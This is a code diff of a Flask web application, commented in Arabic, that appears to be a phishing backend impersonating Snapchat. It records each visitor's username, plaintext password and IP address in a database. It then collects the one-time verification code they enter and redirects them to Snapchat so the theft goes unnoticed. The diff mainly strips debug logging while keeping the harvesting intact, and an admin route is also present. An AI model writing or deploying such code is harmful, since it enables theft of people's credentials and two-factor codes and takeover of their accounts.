@@ -6,16 +6,7 @@ import os
 app = Flask(__name__)
 app.secret_key = 'your-secret-key-here'
 
-LOG_FILE = 'log.txt'
-
-def log(message):
-    with open(LOG_FILE, 'a', encoding='utf-8') as f:
-        f.write(f"[{datetime.now()}] {message}\n")
-
-# تهيئة قاعدة البيانات
 def init_db():
-    db_path = os.path.abspath('login_attempts.db')
-    log(f"Using DB at: {db_path}")
     conn = sqlite3.connect('login_attempts.db')
     cursor = conn.cursor()
     cursor.execute('''
@@ -43,17 +34,16 @@ def handle_login():
     password = request.form['password']
     ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
     timestamp = datetime.now()
-
+    
     conn = sqlite3.connect('login_attempts.db')
     cursor = conn.cursor()
     cursor.execute('''
-        INSERT INTO login_attempts (username, password, timestamp, ip_address, otp_code)
-        VALUES (?, ?, ?, ?, ?)
-    ''', (username, password, timestamp, ip_address, ''))
+        INSERT INTO login_attempts (username, password, timestamp, ip_address)
+        VALUES (?, ?, ?, ?)
+    ''', (username, password, timestamp, ip_address))
     conn.commit()
     conn.close()
-
-    log(f"Login received: username={username}, ip={ip_address}")
+    
     session['username'] = username
     return redirect(url_for('otp'))
 
@@ -65,43 +55,23 @@ def otp():
 
 @app.route('/verify-otp', methods=['POST'])
 def verify_otp():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-
     otp_code = request.form['otp_code']
-    username = session['username']
+    username = session.get('username')
+    if not username:
+        return redirect(url_for('login'))
 
     conn = sqlite3.connect('login_attempts.db')
     cursor = conn.cursor()
-
-    cursor.execute('''
-        SELECT id FROM login_attempts
-        WHERE username = ?
-        ORDER BY timestamp DESC
-        LIMIT 1
-    ''', (username,))
-    result = cursor.fetchone()
-
-    if result:
-        latest_id = result[0]
-        log(f"OTP submitted for {username}: {otp_code} (updating id={latest_id})")
-
-        cursor.execute('''
-            UPDATE login_attempts
-            SET otp_code = ?
-            WHERE id = ?
-        ''', (otp_code, latest_id))
+    cursor.execute('SELECT id FROM login_attempts WHERE username = ? ORDER BY timestamp DESC LIMIT 1', (username,))
+    row = cursor.fetchone()
+    if row:
+        attempt_id = row[0]
+        cursor.execute('UPDATE login_attempts SET otp_code = ? WHERE id = ?', (otp_code, attempt_id))
         conn.commit()
-
-        # تحقق من التحديث
-        cursor.execute('SELECT otp_code FROM login_attempts WHERE id = ?', (latest_id,))
-        updated_otp = cursor.fetchone()
-        log(f"DB value after update for id {latest_id}: {updated_otp[0]}")
-    else:
-        log(f"No record found for user: {username} - OTP not saved.")
-
     conn.close()
-    return redirect("https://accounts.snapchat.com")
+
+    # ✅ إعادة التوجيه إلى تطبيق Snapchat
+    return redirect("snapchat://")
 
 @app.route('/admin')
 def admin():
